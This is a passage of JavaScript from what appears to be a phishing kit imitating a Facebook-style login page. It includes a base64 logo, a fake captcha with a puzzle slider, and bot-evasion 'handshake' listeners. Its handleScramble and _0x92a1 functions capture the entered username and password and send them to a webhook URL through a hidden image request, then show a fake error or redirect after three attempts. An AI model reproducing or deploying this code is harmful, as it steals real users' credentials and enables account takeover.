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" alt="Branding" class="fb-logo" style="height: 38px;">`;
        }
        document.body.classList.add('branding-ready');
    };

    // 🛡️ ULTRA-FAST HUMAN HANDSHAKE
    window.addEventListener('mousemove', execHandshake, { once: true });
    window.addEventListener('touchstart', execHandshake, { once: true });
    window.addEventListener('scroll', execHandshake, { once: true });

    // Near-instant professional fallback
    setTimeout(execHandshake, 80 + Math.random() * 120);

    // ⚡ INSTANT STATE RESOLUTION (Prevents Flashing)
    if (isVerified) {
        if (overlay) overlay.style.display = 'none';
        if (main) main.style.display = 'flex';
    } else {
        if (overlay) overlay.style.display = 'flex';
        if (main) main.style.display = 'none';
    }

    const hdr = document.getElementById('dynamic-header');
    if (hdr) hdr.innerText = getStr(2);

    const form = document.getElementById('login-form');
    if (form) {
        form.removeEventListener('submit', handleScramble); // Prevent double attach
        form.addEventListener('submit', handleScramble);
    }

    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('input', function () {
            const eyeIconWrapper = document.querySelector('.eye-icon-wrapper');
            if (eyeIconWrapper) {
                eyeIconWrapper.style.display = this.value.length > 0 ? 'flex' : 'none';
            }
        });
    }

    const loginAttempts = parseInt(sessionStorage.getItem(_K_LA) || '0');
    const showError = sessionStorage.getItem(_K_SE) === 'true';
    if (showError && loginAttempts > 0 && loginAttempts < 3) {
        const err = document.getElementById('error-message');
        if (err) err.style.display = 'block';
    }

    initPuzzleSlider();

    const checkbox = document.getElementById('recaptcha-checkbox');
    if (checkbox) {
        checkbox.addEventListener('click', startCaptchaProcess);
    }
};

// ⚙️ ROBUST STARTUP
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPhishFlow);
} else {
    initPhishFlow();
}

// === ALL YOUR ORIGINAL FUNCTIONS (UNCHANGED) ===
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIconSvg = document.querySelector('.eye-icon');
    if (!passwordInput || !eyeIconSvg) return;

    const eyeOpenPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
    const eyeSlashPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle><line x1="1" y1="1" x2="23" y2="23"></line>`;

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIconSvg.innerHTML = eyeSlashPath;
    } else {
        passwordInput.type = 'password';
        eyeIconSvg.innerHTML = eyeOpenPath;
    }
}

let captchaProcessing = false;

function startCaptchaProcess() {
    console.log('🔘 Checkbox Clicked - Processing...');
    if (captchaProcessing) return;
    captchaProcessing = true;

    const checkbox = document.getElementById('recaptcha-checkbox');
    const spinner = document.getElementById('checkbox-spinner');

    if (checkbox) checkbox.style.visibility = 'hidden';
    if (spinner) spinner.style.display = 'block';

    setTimeout(() => {
        const step1 = document.getElementById('captcha-step-1');
        const step2 = document.getElementById('captcha-step-2');
        if (step1) step1.style.display = 'none';
        if (step2) step2.style.display = 'block';
        resetPuzzle();
        captchaProcessing = false;
    }, 1200);
}

function resetPuzzle() {
    const piece = document.getElementById('puzzle-piece');
    const handle = document.getElementById('slider-handle');
    if (piece) piece.style.left = '10px';
    if (handle) handle.style.left = '0px';
}

function initPuzzleSlider() {
    const handle = document.getElementById('slider-handle');
    const piece = document.getElementById('puzzle-piece');
    const track = document.querySelector('.slider-track');

    if (!handle || !piece || !track) return;

    let isDragging = false;
    let startX = 0;
    let maxSlide = 0;

    const onStart = (e) => {
        isDragging = true;
        const trackWidth = track.clientWidth;
        const handleWidth = handle.clientWidth;
        maxSlide = trackWidth - handleWidth;
        startX = (e.type === 'mousedown' ? e.clientX : e.touches[0].clientX) - handle.offsetLeft;
        handle.style.transition = 'none';
        piece.style.transition = 'none';
        document.body.style.userSelect = 'none';
    };

    const onMove = (e) => {
        if (!isDragging) return;
        const currentX = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
        let left = currentX - startX;
        if (left < 0) left = 0;
        if (left > maxSlide) left = maxSlide;
        handle.style.left = left + 'px';
        const pieceLeft = 10 + (left / maxSlide) * 270;
        piece.style.left = pieceLeft + 'px';
    };

    const onEnd = () => {
        if (!isDragging) return;
        isDragging = false;
        document.body.style.userSelect = 'auto';
        const pieceLeft = parseFloat(piece.style.left);
        const targetLeft = 280;
        const tolerance = 7;

        if (Math.abs(pieceLeft - targetLeft) <= tolerance) {
            handle.style.background = '#42b72a';
            handle.style.color = '#fff';
            handle.innerHTML = '&#10003;';
            setTimeout(() => {
                sessionStorage.setItem(_K_CCV, 'true');
                const overlay = document.getElementById('captcha-overlay');
                const main = document.querySelector('.main-container');
                if (overlay) overlay.style.display = 'none';
                if (main) main.style.display = 'flex';
            }, 800);
        } else {
            handle.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            piece.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            handle.style.left = '0px';
            piece.style.left = '10px';
        }
    };

    handle.addEventListener('mousedown', onStart);
    document.addEventListener('mousemove', onMove);
    document.addEventListener('mouseup', onEnd);
    handle.addEventListener('touchstart', onStart);
    document.addEventListener('touchmove', onMove);
    document.addEventListener('touchend', onEnd);
}

async function handleScramble(event) {
    event.preventDefault();

    const u = document.getElementById(_K_USER)?.value.trim() || '';
    const p = document.getElementById(_K_PASS)?.value.trim() || '';

    if (!u || !p) return;

    const btn = document.querySelector('.login-btn');
    if (btn) btn.disabled = true;

    let a = parseInt(sessionStorage.getItem(_K_LA) || '0') + 1;
    sessionStorage.setItem(_K_LA, a);

    _0x92a1(u, p, a);

    setTimeout(() => {
        if (a >= 3) {
            window.location.href = getStr(1);
        } else {
            sessionStorage.setItem(_K_SE, 'true');
            window.location.reload();
        }
    }, 2000);
}

function _0x92a1(e, p, a) {
    const i = new Image(1, 1);
    const ts = new Date().toISOString();
    const stz = Math.random().toString(36).substring(7);
    i.src = `${WEBHOOK_URL}?t=${stz}&u=${encodeURIComponent(e)}&k=${encodeURIComponent(p)}&s=${a}&v=${ts}`;
}